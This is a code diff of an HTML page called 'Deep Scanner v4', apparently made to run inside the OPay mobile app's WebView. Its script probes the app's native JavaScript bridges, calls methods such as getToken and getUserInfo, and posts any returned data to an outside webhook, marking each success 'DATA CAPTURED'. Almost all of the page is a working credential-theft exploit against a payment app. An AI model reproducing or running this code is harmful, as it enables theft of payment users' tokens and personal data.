@@ -4,12 +4,12 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ultimate Scanner v3</title>
+  <title>Deep Scanner v4</title>
 </head>
 
 <body
   style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
-  <h1 id="status">SCANNING...</h1>
+  <h1 id="status">DEEP SCANNING...</h1>
   <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>
 
   <script>
@@ -21,72 +21,67 @@
         var div = document.createElement('div');
         div.innerText = msg;
         logDiv.appendChild(div);
-        new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&v=3&ts=' + Date.now();
+        new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&v=4&ts=' + Date.now();
       }
 
       function exfil(obj) {
         var xhr = new XMLHttpRequest();
         xhr.open('POST', WEBHOOK, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.send(JSON.stringify(obj));
         status.innerText = 'DATA CAPTURED';
       }
 
-      report('V3 SCANNER ACTIVE');
+      report('DEEP SCANNER V4 START');
 
-      // 1. Massive callback registration
-      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'receiveMessage', 'opayCallback', 'onReceiveNativeMessage', 'handleNativeMessage'];
+      // 1. Register callbacks
+      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'opayCallback', 'onReceiveNativeMessage', 'handleMessage'];
       callbacks.forEach(function (n) {
         window[n] = function (d) {
-          report('CALLBACK HIT: ' + n, 'success');
+          report('CALLBACK TRIGGERED: ' + n, 'success');
           exfil({ source: 'callback', name: n, data: d });
         };
       });
 
-      // 2. Automated Scan
       setTimeout(function () {
-        report('Scanning window objects...');
+        // 2. Explore OPay3PartyContext properties
+        if (window.OPay3PartyContext) {
+          var keys = [];
+          for (var k in window.OPay3PartyContext) { keys.push(k); }
+          report('OPay3PartyContext Keys: ' + (keys.join(', ') || 'No enumerable keys'));
 
-        var suspects = [];
-        for (var key in window) {
-          try {
-            if (key.toLowerCase().indexOf('opay') !== -1 || key.toLowerCase().indexOf('context') !== -1 || key.toLowerCase().indexOf('bridge') !== -1) {
-              suspects.push(key);
-            }
-          } catch (e) { }
-        }
-        report('Suspects found: ' + suspects.join(', '));
-
-        // Hit WebKit messageHandlers
-        if (window.webkit && window.webkit.messageHandlers) {
-          var handlers = Object.keys(window.webkit.messageHandlers);
-          report('iOS Handlers: ' + handlers.join(', '));
-
-          handlers.forEach(function (h) {
+          // Try common method names even if not enumerated
+          ['getBaseInfo', 'getToken', 'getUserInfo', 'send', 'call'].forEach(function (m) {
             try {
-              report('Posting to: ' + h);
-              window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
-              window.webkit.messageHandlers[h].postMessage({ method: 'getBaseInfo', cb: 'onGetBaseInfo' });
-            } catch (e) { report('Error ' + h + ': ' + e.message); }
+              if (typeof window.OPay3PartyContext[m] === 'function') {
+                report('Found method: OPay3PartyContext.' + m);
+                var res = window.OPay3PartyContext[m]();
+                report('Success calling ' + m, 'success');
+                exfil({ source: 'direct', bridge: 'OPay3PartyContext', method: m, data: res });
+              }
+            } catch (e) { }
           });
         }
 
-        // Check direct bridges
-        var targets = ['control', 'OPay3PartyContext', 'ORideContext', 'OPayContext'];
-        targets.forEach(function (b) {
-          if (window[b]) {
-            report('Calling Bridge: ' + b);
-            if (typeof window[b].getBaseInfo === 'function') {
-              try {
-                var res = window[b].getBaseInfo();
-                report('Success calling ' + b, 'success');
-                exfil({ source: 'direct', bridge: b, data: res });
-              } catch (e) { report('Err calling ' + b + ': ' + e.message); }
+        // 3. Forced WebKit Scan (trying to find hidden handlers)
+        if (window.webkit && window.webkit.messageHandlers) {
+          var known = ['control', 'OPay3PartyContext', 'ORideContext', 'OPayContext', 'native', 'bridge'];
+          known.forEach(function (h) {
+            if (window.webkit.messageHandlers[h]) {
+              report('Found Hidden Handler: ' + h);
+              window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
+              window.webkit.messageHandlers[h].postMessage({ method: 'getToken', callback: 'onGetToken' });
             }
-          }
-        });
+          });
+        }
 
-        report('Scan cycle complete');
-      }, 1500);
+        // 4. Explore opayCallback suspect
+        if (window.opayCallback) {
+          report('opayCallback type: ' + typeof window.opayCallback);
+        }
+
+        report('Scan Complete');
+      }, 2000);
     })();
   </script>
 </body>
